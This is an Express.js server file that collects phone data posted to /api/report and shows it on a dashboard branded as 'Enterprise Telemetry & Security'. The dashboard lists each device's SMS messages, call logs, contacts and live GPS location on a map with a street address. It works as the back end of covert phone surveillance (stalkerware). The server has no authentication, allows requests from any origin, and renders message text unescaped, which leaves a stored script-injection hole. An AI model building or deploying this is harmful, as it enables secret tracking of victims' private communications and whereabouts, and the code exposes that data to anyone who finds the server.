const express = require('express');
const cors = require('cors');
const app = express();

app.use(express.json({ limit: '10mb' }));
app.use(cors());

let devicesData = {};

app.post('/api/report', (req, res) => {
    const data = req.body;
    const deviceId = data.device?.model || 'Unknown Device';
    console.log(`📥 Data received from ${deviceId}`);
    devicesData[deviceId] = { 
        ...data, 
        lastUpdated: new Date().toLocaleString('en-KE', { timeZone: 'Africa/Nairobi', timeStyle: 'short' }) 
    };
    res.json({ success: true });
});

app.get('/api/devices', (req, res) => res.json(devicesData));

app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en" class="dark">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Device Monitor | Enterprise Dashboard</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <script>
            tailwind.config = {
                darkMode: 'class',
                theme: {
                    extend: {
                        colors: {
                            brand: '#3b82f6',
                            darkBg: '#0b1120',
                            darkCard: '#1e293b',
                            lightBg: '#f1f5f9',
                            lightCard: '#ffffff'
                        },
                        fontFamily: {
                            sans: ['Inter', 'system-ui', 'sans-serif'],
                            mono: ['JetBrains Mono', 'monospace']
                        }
                    }
                }
            }
        </script>
        <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
        <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
        
        <style>
            body { font-family: 'Inter', sans-serif; transition: background-color 0.3s, color 0.3s; }
            .dark body { background-color: #0b1120; color: #f8fafc; }
            body { background-color: #f1f5f9; color: #0f172a; }

            .glass-card { transition: transform 0.2s, background-color 0.3s, border-color 0.3s, box-shadow 0.3s; }
            .dark .glass-card { background: rgba(30, 41, 59, 0.75); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 0 20px 30px -10px rgba(0, 0, 0, 0.6), 0 8px 15px -6px rgba(0, 0, 0, 0.4); }
            .glass-card { background: rgba(255, 255, 255, 0.75); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border: 1px solid rgba(0, 0, 0, 0.05); box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 8px 10px -6px rgba(0, 0, 0, 0.05); }
            .glass-card:hover { border-color: #3b82f6; box-shadow: 0 20px 30px -8px rgba(59, 130, 246, 0.3); }

            .custom-scrollbar::-webkit-scrollbar { width: 5px; }
            .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
            .custom-scrollbar::-webkit-scrollbar-thumb { background: #475569; border-radius: 10px; }
            .dark .custom-scrollbar::-webkit-scrollbar-thumb { background: #334155; }

            #map { height: 100%; min-height: 250px; border-radius: 0.75rem; z-index: 1; }
            
            details > summary { list-style: none; cursor: pointer; }
            details > summary::-webkit-details-marker { display: none; }
            details[open] .arrow { transform: rotate(180deg); }
            .arrow { transition: transform 0.3s ease; }

            /* Live pulse dot */
            .live-dot { position: relative; display: inline-flex; width: 10px; height: 10px; }
            .live-dot .ping { position: absolute; display: inline-flex; height: 100%; width: 100%; border-radius: 9999px; background: #34d399; opacity: 0.75; animation: ping 1.5s cubic-bezier(0, 0, 0.2, 1) infinite; }
            .live-dot .core { position: relative; display: inline-flex; border-radius: 9999px; height: 10px; width: 10px; background: #10b981; }
            @keyframes ping { 75%, 100% { transform: scale(2); opacity: 0; } }

            .custom-icon { background: transparent; border: none; }

            /* Badge styles */
            .badge-charging { background: rgba(16, 185, 129, 0.12); color: #059669; border: 1px solid rgba(16, 185, 129, 0.25); font-weight: 700; font-size: 10px; letter-spacing: 0.04em; text-transform: uppercase; padding: 0.25rem 0.65rem; border-radius: 0.5rem; display: inline-flex; align-items: center; gap: 4px; }
            .dark .badge-charging { color: #34d399; background: rgba(16, 185, 129, 0.1); border-color: rgba(16, 185, 129, 0.3); }
            .badge-battery { background: rgba(245, 158, 11, 0.12); color: #d97706; border: 1px solid rgba(245, 158, 11, 0.25); font-weight: 700; font-size: 10px; letter-spacing: 0.04em; text-transform: uppercase; padding: 0.25rem 0.65rem; border-radius: 0.5rem; display: inline-flex; align-items: center; gap: 4px; }
            .dark .badge-battery { color: #fbbf24; background: rgba(245, 158, 11, 0.1); border-color: rgba(245, 158, 11, 0.3); }

            .header-divider { border-bottom: 1px solid rgba(148, 163, 184, 0.25); }
            .dark .header-divider { border-bottom: 1px solid rgba(71, 85, 105, 0.5); }
        </style>
    </head>
    <body class="p-4 md:p-8 transition-colors duration-300">
        <div class="max-w-7xl mx-auto">
            
            <!-- Header & Theme Toggle -->
            <header class="flex flex-col md:flex-row md:items-center justify-between mb-8 pb-6 header-divider transition-colors">
                <div class="flex items-center gap-4">
                    <div class="bg-blue-600 p-3 rounded-xl shadow-lg shadow-blue-500/30">
                        <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
                    </div>
                    <div>
                        <h1 class="text-2xl md:text-3xl font-extrabold tracking-tight">Device Monitor</h1>
                        <p class="text-xs md:text-sm text-slate-500 dark:text-slate-400 font-medium tracking-wide mt-1">ENTERPRISE TELEMETRY &amp; SECURITY</p>
                    </div>
                </div>
                
                <div class="mt-4 md:mt-0 flex items-center gap-3">
                    <button onclick="toggleTheme()" class="p-2.5 rounded-lg bg-slate-200 dark:bg-slate-800 text-slate-600 dark:text-slate-300 border border-slate-300 dark:border-slate-700 hover:bg-slate-300 dark:hover:bg-slate-700 transition shadow-sm">
                        <svg id="theme-icon" class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path></svg>
                    </button>
                    
                    <div class="flex items-center gap-2 bg-slate-200 dark:bg-slate-800/50 px-4 py-2.5 rounded-full border border-slate-300 dark:border-slate-700 shadow-sm">
                        <span class="live-dot">
                            <span class="ping"></span>
                            <span class="core"></span>
                        </span>
                        <span class="text-xs font-bold text-emerald-600 dark:text-emerald-400 tracking-wide">SYSTEM LIVE</span>
                    </div>
                </div>
            </header>

            <!-- Devices Container -->
            <div id="devices-container" class="space-y-6">
                <div class="flex flex-col items-center justify-center mt-32 text-slate-500">
                    <svg class="w-12 h-12 mb-4 animate-spin" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
                    <p class="text-sm font-medium tracking-wide">Awaiting secure connection...</p>
                </div>
            </div>
        </div>

        <script>
            // --- Theme Toggle Logic ---
            function toggleTheme() {
                const html = document.documentElement;
                const icon = document.getElementById('theme-icon');
                
                if (html.classList.contains('dark')) {
                    html.classList.remove('dark');
                    icon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path>';
                } else {
                    html.classList.add('dark');
                    icon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path>';
                }
                if (mapInstance) updateMapTheme();
            }

            // --- Map Logic ---
            let mapInstance = null;
            let mapMarker = null;
            let currentGeocodedAddress = "Fetching address...";
            let lastLocationKey = "";
            let currentTileLayer = null;

            function updateMapTheme() {
                if (!mapInstance) return;
                const isDark = document.documentElement.classList.contains('dark');
                const tileUrl = 'https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png';
                
                if (currentTileLayer) mapInstance.removeLayer(currentTileLayer);
                currentTileLayer = L.tileLayer(tileUrl, { attribution: '© OpenStreetMap' }).addTo(mapInstance);
                
                const mapPane = document.querySelector('.leaflet-layer');
                if (mapPane) {
                    mapPane.style.filter = isDark ? 'invert(1) hue-rotate(180deg) brightness(0.8) contrast(1.2)' : 'none';
                }
            }

            async function getAddress(lat, lng) {
                try {
                    const response = await fetch(\`https://nominatim.openstreetmap.org/reverse?format=json&lat=\${lat}&lon=\${lng}\`);
                    const data = await response.json();
                    return data.display_name || "Unknown Location";
                } catch (e) {
                    return "Location unavailable";
                }
            }

            function formatKenyanTime(dateInput) {
                if (!dateInput) return "Unknown time";
                const d = new Date(dateInput);
                return d.toLocaleString('en-KE', { timeZone: 'Africa/Nairobi', dateStyle: 'short', timeStyle: 'short' });
            }

            async function fetchData() {
                try {
                    const res = await fetch('/api/devices');
                    const devices = await res.json();
                    const container = document.getElementById('devices-container');
                    
                    if (Object.keys(devices).length === 0) return;

                    let html = '';
                    
                    for (const [id, data] of Object.entries(devices)) {
                        const isCharging = data.isCharging 
                            ? '<span class="badge-charging">⚡ Charging</span>' 
                            : '<span class="badge-battery">🔋 Battery</span>';

                        const wifiName = data.wifi === 'Wi-Fi Connected' ? 'Wi-Fi Network' : (data.wifi || 'Unknown');

                        const locationKey = \`\${data.location?.lat},\${data.location?.lng}\`;
                        if (locationKey !== lastLocationKey && data.location?.lat !== 0) {
                            lastLocationKey = locationKey;
                            currentGeocodedAddress = "Fetching address...";
                            getAddress(data.location.lat, data.location.lng).then(addr => {
                                currentGeocodedAddress = addr;
                                const addressEl = document.getElementById('address-text');
                                if (addressEl) addressEl.innerText = addr;
                            });
                        }

                        const smsHtml = (data.sms || []).map(s => {
                            let timeStr = formatKenyanTime(s.date);
                            return \`
                            <details class="group bg-slate-100 dark:bg-slate-900/50 rounded-lg border border-slate-200 dark:border-slate-700/50 mb-2 overflow-hidden transition-colors hover:border-blue-400 dark:hover:border-blue-500">
                                <summary class="flex justify-between items-center p-3">
                                    <div class="flex flex-col min-w-0 pr-3">
                                        <span class="text-blue-600 dark:text-indigo-400 font-semibold text-xs md:text-sm truncate">\${s.address}</span>
                                        <span class="text-xs text-slate-600 dark:text-slate-400 truncate mt-0.5">\${s.body}</span>
                                    </div>
                                    <div class="flex flex-col items-end shrink-0 gap-1">
                                        <span class="text-[9px] md:text-[10px] text-slate-500 font-mono">\${timeStr}</span>
                                        <svg class="w-3 h-3 text-slate-400 arrow" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
                                    </div>
                                </summary>
                                <div class="p-3 bg-white dark:bg-slate-900 border-t border-slate-200 dark:border-slate-800 text-xs md:text-sm text-slate-700 dark:text-slate-300">
                                    \${s.body}
                                </div>
                            </details>
                            \`;
                        }).join('');

                        const callsHtml = (data.calls || []).map(c => {
                            let timeStr = formatKenyanTime(c.date);
                            const isMissed = c.type === 'Missed';
                            return \`
                            <div class="flex justify-between items-center p-2.5 mb-1 bg-slate-100 dark:bg-slate-900/40 rounded-lg border border-slate-200 dark:border-slate-700/40">
                                <div>
                                    <span class="\${isMissed ? 'text-red-500' : 'text-slate-700 dark:text-slate-200'} font-medium text-xs md:text-sm block">\${c.number}</span>
                                    <span class="text-[9px] md:text-[10px] text-slate-500 font-mono mt-0.5 block">\${timeStr}</span>
                                </div>
                                <div class="text-right">
                                    <span class="text-[9px] md:text-[10px] uppercase tracking-wider \${isMissed ? 'text-red-500' : 'text-slate-500'} font-bold block">\${c.type}</span>
                                    <span class="text-[9px] md:text-[10px] text-slate-500">\${c.duration}s</span>
                                </div>
                            </div>
                            \`;
                        }).join('');

                        const contactsHtml = (data.contacts || []).map(c => \`
                            <div class="flex justify-between items-center p-2 mb-1 bg-slate-100 dark:bg-slate-900/40 rounded-lg border border-slate-200 dark:border-slate-700/40">
                                <span class="text-slate-700 dark:text-slate-300 font-medium text-xs md:text-sm truncate pr-2">\${c.name}</span>
                                <span class="text-[9px] md:text-[10px] font-mono text-slate-500 shrink-0">\${c.number}</span>
                            </div>
                        \`).join('');

                        html += \`
                        <div class="glass-card overflow-hidden mb-6">
                            <div class="px-4 md:px-6 py-4 border-b border-slate-200 dark:border-slate-700/50 flex flex-col sm:flex-row sm:justify-between sm:items-center gap-3 bg-slate-50/80 dark:bg-slate-800/30">
                                <div class="flex items-center gap-3 md:gap-4">
                                    <div class="bg-white dark:bg-slate-900 p-2 rounded-lg border border-slate-200 dark:border-slate-700 shadow-sm">
                                        <svg class="w-5 h-5 md:w-6 md:h-6 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
                                    </div>
                                    <div>
                                        <h2 class="text-lg md:text-xl font-bold tracking-wide">\${id}</h2>
                                        <p class="text-[10px] md:text-xs text-slate-500 dark:text-slate-400 font-mono mt-0.5">OS: \${data.device?.os || 'Android'}</p>
                                    </div>
                                </div>
                                <div>
                                    <span class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-white dark:bg-slate-900/80 border border-slate-200 dark:border-slate-700 text-[10px] font-mono text-slate-600 dark:text-slate-300 shadow-sm">
                                        <span class="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
                                        SYNC: \${data.lastUpdated || '—'}
                                    </span>
                                </div>
                            </div>

                            <div class="grid grid-cols-1 lg:grid-cols-3">
                                <div class="p-4 md:p-6 flex flex-col gap-4 md:gap-6 border-b lg:border-b-0 lg:border-r border-slate-200 dark:border-slate-700/50 bg-white/50 dark:bg-transparent">
                                    <div class="flex justify-between items-start">
                                        <div>
                                            <p class="text-[10px] text-slate-500 font-bold uppercase tracking-widest mb-1">Battery Level</p>
                                            <div class="flex items-end gap-2">
                                                <span class="text-4xl md:text-5xl font-black">\${data.battery || 0}<span class="text-xl md:text-2xl text-slate-400">%</span></span>
                                            </div>
                                        </div>
                                        <div>\${isCharging}</div>
                                    </div>
                                    
                                    <div class="h-px w-full bg-slate-200 dark:bg-slate-700/50"></div>

                                    <div class="grid grid-cols-2 lg:grid-cols-1 gap-4">
                                        <div>
                                            <p class="text-[10px] text-slate-500 font-bold uppercase tracking-widest mb-1">Network Status</p>
                                            <div class="flex items-center gap-2">
                                                <span class="w-2 h-2 rounded-full \${data.online ? 'bg-emerald-500' : 'bg-red-500'}"></span>
                                                <span class="text-sm md:text-base font-semibold">\${data.online ? "Connected" : "Offline"}</span>
                                            </div>
                                        </div>
                                        <div>
                                            <p class="text-[10px] text-slate-500 font-bold uppercase tracking-widest mb-1">Connection</p>
                                            <p class="text-xs md:text-sm text-slate-700 dark:text-slate-300 font-mono bg-slate-100 dark:bg-slate-800/50 p-1.5 rounded inline-block truncate max-w-full">\${wifiName}</p>
                                        </div>
                                    </div>
                                </div>

                                <div class="lg:col-span-2 relative flex flex-col bg-slate-100 dark:bg-slate-900/50 min-h-[250px]">
                                    <div id="map" class="w-full h-full absolute inset-0"></div>
                                    <div class="absolute bottom-0 left-0 right-0 p-3 border-t border-slate-200 dark:border-slate-700/50 bg-white/90 dark:bg-slate-800/80 flex items-start gap-2 backdrop-blur-md z-10">
                                        <div class="bg-blue-500/10 p-1.5 rounded text-blue-500 dark:text-blue-400 mt-0.5">
                                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                                        </div>
                                        <div class="flex-1 min-w-0">
                                            <p class="text-[9px] text-slate-500 font-bold uppercase tracking-widest">GPS Address</p>
                                            <p id="address-text" class="text-xs font-medium text-slate-800 dark:text-slate-200 mt-0.5 truncate">\${currentGeocodedAddress}</p>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="grid grid-cols-1 md:grid-cols-3 border-t border-slate-200 dark:border-slate-700/50 bg-slate-50 dark:bg-slate-900/30">
                                <div class="border-b md:border-b-0 md:border-r border-slate-200 dark:border-slate-700/50 flex flex-col h-64 md:h-72">
                                    <div class="p-3 border-b border-slate-200 dark:border-slate-700/50 flex items-center gap-2 bg-white dark:bg-slate-800/20">
                                        <svg class="w-4 h-4 text-slate-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"></path></svg>
                                        <h3 class="font-bold text-slate-600 dark:text-slate-300 text-[10px] md:text-xs uppercase tracking-wider">Call Logs</h3>
                                    </div>
                                    <div class="p-2 overflow-y-auto custom-scrollbar flex-1">
                                        \${callsHtml || '<p class="text-xs text-slate-500 p-2">No calls</p>'}
                                    </div>
                                </div>

                                <div class="border-b md:border-b-0 md:border-r border-slate-200 dark:border-slate-700/50 flex flex-col h-64 md:h-72">
                                    <div class="p-3 border-b border-slate-200 dark:border-slate-700/50 flex items-center gap-2 bg-white dark:bg-slate-800/20">
                                        <svg class="w-4 h-4 text-slate-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
                                        <h3 class="font-bold text-slate-600 dark:text-slate-300 text-[10px] md:text-xs uppercase tracking-wider">Recent SMS</h3>
                                    </div>
                                    <div class="p-2 overflow-y-auto custom-scrollbar flex-1">
                                        \${smsHtml || '<p class="text-xs text-slate-500 p-2">No messages</p>'}
                                    </div>
                                </div>

                                <div class="flex flex-col h-64 md:h-72">
                                    <div class="p-3 border-b border-slate-200 dark:border-slate-700/50 flex items-center gap-2 bg-white dark:bg-slate-800/20">
                                        <svg class="w-4 h-4 text-slate-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
                                        <h3 class="font-bold text-slate-600 dark:text-slate-300 text-[10px] md:text-xs uppercase tracking-wider">Contacts</h3>
                                    </div>
                                    <div class="p-2 overflow-y-auto custom-scrollbar flex-1">
                                        \${contactsHtml || '<p class="text-xs text-slate-500 p-2">No contacts</p>'}
                                    </div>
                                </div>
                            </div>
                        </div>
                        \`;
                    }
                    
                    container.innerHTML = html;

                    const firstDevice = Object.values(devices)[0];
                    if (firstDevice && firstDevice.location && firstDevice.location.lat !== 0) {
                        const lat = firstDevice.location.lat;
                        const lng = firstDevice.location.lng;

                        setTimeout(() => {
                            if (!mapInstance) {
                                mapInstance = L.map('map', { zoomControl: false }).setView([lat, lng], 16);
                                updateMapTheme();
                                
                                const customIcon = L.divIcon({
                                    className: 'custom-icon',
                                    html: '<div style="background-color: #3b82f6; width: 14px; height: 14px; border-radius: 50%; border: 3px solid white; box-shadow: 0 0 10px #3b82f6;"></div>',
                                    iconSize: [14, 14],
                                    iconAnchor: [7, 7]
                                });

                                mapMarker = L.marker([lat, lng], {icon: customIcon}).addTo(mapInstance);
                            } else {
                                mapInstance.setView([lat, lng]);
                                mapMarker.setLatLng([lat, lng]);
                            }
                            mapInstance.invalidateSize();
                        }, 100);
                    }

                } catch (e) {
                    console.error("Error fetching data:", e);
                }
            }
            
            fetchData();
            setInterval(fetchData, 3000);
        </script>
    </body>
    </html>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Dashboard running on port ${PORT}`));
